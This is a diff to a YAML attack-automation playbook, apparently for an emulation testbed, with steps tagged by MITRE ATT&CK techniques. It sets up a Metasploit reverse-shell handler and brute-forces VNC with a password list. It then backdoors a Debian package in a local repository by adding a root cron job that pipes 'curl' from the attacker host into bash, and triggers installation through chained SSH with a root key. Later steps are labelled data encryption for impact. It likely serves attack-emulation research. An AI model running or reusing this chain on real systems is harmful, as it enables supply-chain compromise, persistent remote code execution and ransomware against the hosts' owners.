@@ -1,30 +1,33 @@
-#### THIS EXPLOIT IS BROKEN DUE TO CHANGE IN VERSION ###
-
 ####################
 #
-# Scenario 3 b b
+# Scenario 3 b a
 #
 ####################
 
-# for vnc connection to the display, tunnel with : ssh -J aecid@<mgmt-ip> -L 5901:172.17.100.122:5901 aecid@172.17.100.122
+# for vnc connection to the display, tunnel with : ssh -J aecid@10.110.0.172 -L 5901:172.17.100.122:5901 aecid@172.17.100.122
 # then vncviewer localhost:5901
 
 vars:
   $SERVER_ADDRESS: fw.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
+  $DNS_SERVER: 192.42.0.233
+  $ADMIN_SERVER: 10.12.0.223
+####################
+#  YOU NEED TO ENTER YOUR  MGMT_IP FOR YOUR SETUP! #
+####################
+  $MGMT_IP: 192.42.0.201
   $LISTA:
-  - "password1"
-  - "password2"
-  - "password3"
-  - "password4"
-  - "password5"
-  - "123"
-  - "12345"
+#  - "password1"
+#  - "password2"
+#  - "password3"
+#  - "password4"
+#  - "password5"
+#  - "123"
+#  - "12345"
   - "12345678"
  
 commands:
-
-### PREPARE THE REVERSE SHELL FOR THE REPOSERVER
+### PREPARE THE REVERSE SHELL 
   - type: mktemp
     cmd: file
     variable: RSHELL
@@ -37,7 +40,7 @@ commands:
     local_path: $RSHELL
 
   - type: msf-module
-    creates_session: portforward
+    creates_session: movement
     cmd: exploit/multi/handler
     payload: "cmd/unix/python/meterpreter/reverse_tcp"
     payload_options:
@@ -51,7 +54,6 @@ commands:
     port: 8888
     background: True
     kill_on_exit: true
-
 
 ### BRUTEFORCE VNC
   - type: loop
@@ -213,85 +215,199 @@ commands:
   - type: sleep
     seconds: 2
 
-#  HERE THE REVERSE SHELL FOR PORTFORWARDING ON THE REPOSERVER IS ESTABLISHED
+# LATERAL MOVEMENT
+
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "ls -l /var/www/html/debian"
+    metadata:
+      action: "ls -l /var/www/html/debian"
+
   - type: vnc
     session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1083"
+      tactics: "Discovery"
+      technique_name: "File and Directory Discovery"
+
+  - type: vnc
     cmd: type
-    input: curl http:///$ATTACKER_ADDRESS:8888/install.sh | bash
+    session: foothold
+    input: "apt update && apt install -y dpkg-dev"
+    metadata:
+      action: "apt update && apt install -y dpkg-dev"
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   - type: sleep
-    seconds: 2
+    seconds: 360
+
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "mkdir /tmp/.tmux_data"
+    metadata:
+      action: "mkdir /tmp/.tmux_data"
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1036.005,T1564.001 "
+      tactics: "Defense Evasion"
+      technique_name: "Masquerading: Match Legitimate Name or Location,Hide Artifacts: Hidden Files and Directories"
+
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "cd /tmp/.tmux_data"
+    metadata:
+      action: "cd /tmp/.tmux_data"
+
 
   - type: vnc
     session: foothold
     cmd: key
     key: "enter"
 
-  - type: sleep
-    seconds: 5
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd"
+    metadata:
+      action: "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd"
 
   - type: vnc
-    cmd: close
     session: foothold
+    cmd: key
+    key: "enter"
     metadata:
-      techniques: "T1021.005"
-      tactics: "Lateral Movement"
-      technique_name: "Remote Services: VNC"
+      techniques: "T1574"
+      tactics: "Persistence,Defense Evasion"
+      technique_name: "Hijack Execution Flow"
 
-
-#### Here the lateral movement steps take place
-
-  - type: msf-session
-    session: portforward
-    cmd: sysinfo
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "cd healthcheckd"
     metadata:
-      techniques: "T1082"
-      tactics: "Discovery"
-      technique_name: "System Information Discovery"
+      action: "cd healthcheckd"
 
-  - type: msf-session
-    session: portforward
-    cmd: portfwd add -l 1881 -r 192.168.100.23 -p 1881
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: |
+      sed -i 's/1\.0-1/1\.0-2/g' DEBIAN/control
     metadata:
-      techniques: "T1572"
-      tactics: "Command and Control"
-      technique_name: "Protocol Tunneling"
+      techniques: "T1059,T1574"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter,Hijack Execution Flow"
+      action: "sed DEBIAN/control"
 
 
-## This is the healthcheck exploit that needs fixing -> offsets are different in new version
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
 
-  - type: msf-module
-    creates_session: movement
-    cmd: exploit/linux/misc/healthcheck_rce
-    payload: "cmd/linux/http/x64/meterpreter_reverse_tcp"
-    payload_options:
-      LHOST: $ATTACKER_ADDRESS
-      LPORT: "4444"
-    options:
-      RHOSTS: 127.0.0.1  
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: |
+      sed -i "/invoke-rc/a echo '*/5 * * * * root /usr/bin/curl http://192.42.1.174:8888/install.sh | /bin/bash' > /etc/cron.d/health" DEBIAN/postinst
     metadata:
-      techniques: "T1210"
-      tactics: "Lateral Movement"
-      technique_name: "Exploitation of Remote Services"
+      techniques: "T1053.003,T1105,T1071.001 "
+      tactics: "Persistence,Command and Control"
+      technique_name: "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols"
+      action: "sed -i invoke-rc"
 
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
 
-#################### MOVED ############################################
-  - type: msf-session
-    session: movement
-    cmd: sysinfo
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "cd .."
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb"
     metadata:
-      techniques: "T1082"
-      tactics: "Discovery"
-      technique_name: "System Information Discovery"
+      action: "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb"
 
-  - type: msf-session
-    session: movement
-    cmd: getuid
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
     metadata:
-      techniques: "T1033"
-      tactics: "Discovery"
-      technique_name: "System Owner/User Discovery"
+      techniques: "T1072"
+      tactics: "Execution,Lateral Movement"
+      technique_name: "Software Deployment Tools"
 
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "cd /var/www/html/debian/"
+    metadata:
+      action: "cd /var/www/html/debian/"
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+
+  - type: vnc
+    cmd: type
+    session: foothold
+    input: "dpkg-scanpackages . | gzip -c9  > Packages.gz"
+    metadata:
+      action: "dpkg-scanpackages . | gzip -c9  > Packages.gz"
+
+  - type: vnc
+    session: foothold
+    cmd: key
+    key: "enter"
+    metadata:
+      techniques: "T1072"
+      tactics: "Execution,Lateral Movement"
+      technique_name: "Software Deployment Tools"
+
+### EXECUTION VIA MGMT AND ADMIN PC
+
+ # connect via jumphost to admin host, that ssh to linuxshare
+  - type: shell
+    cmd: ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o "ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@$MGMT_IP" aecid@10.12.0.223 'echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 '\''apt update && apt install -y healthcheckd'\''" | at now + 2 minute'
+    metadata:
+      delayed_manifestation: "120s"
+
+  - type: sleep
+    seconds: 180
+
+#################### MOVED ################################
   - type: msf-session
     session: movement
     cmd: shell
@@ -310,7 +426,7 @@ commands:
     metadata:
       techniques: "T1486,T1105"
       tactics: "Impact,Command and Control"
-      technique_name: "Data Encrypted for Impact,Ingress Tool Transfer"
+      technique_name: "Data Encrypted for Impact, Ingress Tool Transfer"
 
   - type: msf-session
     session: movement
@@ -318,7 +434,7 @@ commands:
     metadata:
       techniques: "T1486,T1565.001"
       tactics: "Impact"
-      technique_name: "Data Encrypted for Impact,Data Manipulation: Stored Data Manipulation"
+      technique_name: "Data Encrypted for Impact, Data Manipulation: Stored Data Manipulation"
 
   - type: msf-session
     session: movement
@@ -370,3 +486,8 @@ commands:
 
   - type: sleep
     seconds: 30
+
+
+
+    
+ 
